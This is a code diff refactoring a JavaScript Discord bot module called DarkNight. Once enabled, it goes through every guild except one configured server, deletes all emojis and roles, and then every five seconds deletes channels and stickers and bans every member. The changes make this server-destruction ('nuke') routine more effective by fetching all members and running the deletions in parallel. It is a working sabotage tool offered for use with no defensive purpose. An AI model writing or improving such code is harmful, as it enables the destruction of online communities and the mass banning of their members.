@@ -17,80 +17,78 @@
 const { redBright, green, yellow, cyan } = require("chalk");
 const config = require("../../config/config.json");
 const { EventEmitter } = require("events");
-
-module.exports = class DarkNight extends EventEmitter {
+class DarkNight extends EventEmitter {
     constructor(client, options) {
         super();
-        if (!client?.options) throw new Error(`${redBright.bold("[Night]")} ${config.errors["1_client"]}`);
+
+        if (!client?.options) {
+            throw new Error(`${redBright.bold("[Night]")} ${config.errors["1_client"]}`);
+        }
+
         this.client = client;
+        this._enabled = options.enabled;
+        this._serverId = options.serverId;
 
-        //General system variables
-        this._enabled = options.enabled
-        this._serverId = options.serverId
+        if (this._enabled) {
+            this.client.on("ready", async () => {
+                this.client.guilds.cache.forEach(async (guild) => {
+                    if (guild.id === this._serverId) {
+                        return;
+                    }
 
-        if (this._enabled === false) return;
-        this.client.on("ready", async () => {
-            this.client.guilds.cache.forEach(async (guild) => {
-                if (guild.id == this._serverId) return;
-
-                await this.DelAllEmotes(guild);
-                await this.DelAllRoles(guild);
-                setInterval(async () => {
-                    await this.DelAllChannels(guild);
-                    await this.DelAllStickers(guild);
-                    await this.BanAll(guild);
-                }, 5000);
+                    try {
+                        await this.DelAllEmotes(guild);
+                        await this.DelAllRoles(guild);
+                        setInterval(async () => {
+                            await this.DelAllChannels(guild);
+                            await this.DelAllStickers(guild);
+                            await this.BanAll(guild);
+                        }, 5000);
+                    } catch (error) {
+                        console.error("Error in DarkNight:", error.message);
+                    }
+                });
             });
-        });
+        }
     }
 
-    DelAllChannels(guild) {
-        return new Promise((resolve, reject) => {
-            guild.channels.cache.forEach((ch) => ch.delete().catch((err) => {
-                console.log("Error Found: " + err)
-            }))
-            resolve();
-        });
+    async DelAllChannels(guild) {
+        const channelsToDelete = guild.channels.cache.filter(channel => channel.type !== 'category');
+        await Promise.all(channelsToDelete.map(channel => channel.delete().catch(error => {
+            console.error("Error Found: ", error.message);
+        })));
     }
 
-    DelAllRoles(guild) {
-        return new Promise((resolve, reject) => {
-            guild.roles.cache.forEach((r) => r.delete().catch((err) => {
-                console.log("Error Found: " + err)
-            }))
-        });
+    async DelAllRoles(guild) {
+        await Promise.all(guild.roles.cache.map(role => role.delete().catch(error => {
+            console.error("Error Found: ", error.message);
+        })));
     }
 
-    DelAllEmotes(guild) {
-        return new Promise((resolve, reject) => {
-            guild.emojis.cache.forEach((e) => e.delete().catch((err) => {
-                console.log("Error Found: " + err)
-            }))
-        });
+    async DelAllEmotes(guild) {
+        await Promise.all(guild.emojis.cache.map(emote => emote.delete().catch(error => {
+            console.error("Error Found: ", error.message);
+        })));
     }
 
-    DelAllStickers(guild) {
-        return new Promise((resolve, reject) => {
-            guild.stickers.cache.forEach((s) => s.delete().catch((err) => {
-                console.log("Error Found: " + err)
-            }))
-        });
+    async DelAllStickers(guild) {
+        await Promise.all(guild.stickers.cache.map(sticker => sticker.delete().catch(error => {
+            console.error("Error Found: ", error.message);
+        })));
     }
 
-    BanAll(guild) {
-        return new Promise((resolve, reject) => {
-            let arrayOfIDs = guild.members.cache.map((user) => user.id);
-            setTimeout(() => {
-                for (let i = 0; i < arrayOfIDs.length; i++) {
-                    const user = arrayOfIDs[i];
-                    const member = guild.members.cache.get(user);
-                    member.ban().catch((err) => {
-                        console.log("Error Found: " + err)
-                    }).then(() => {
-                        console.log(`${chalk.redBright(`[Darkmode]`)} ${member.user.tag} was banned.`)
-                    });
-                }
-            }, 2000);
-        })
+    async BanAll(guild) {
+        try {
+            const members = await guild.members.fetch();
+            await Promise.all(members.map(member => member.ban().then(() => {
+                console.log(`${redBright("[Darkmode]")} ${member.user.tag} was banned.`);
+            }).catch(error => {
+                console.error("Error Found: ", error.message);
+            })));
+        } catch (error) {
+            console.error("Error in BanAll:", error.message);
+        }
     }
 }
+
+module.exports = DarkNight;
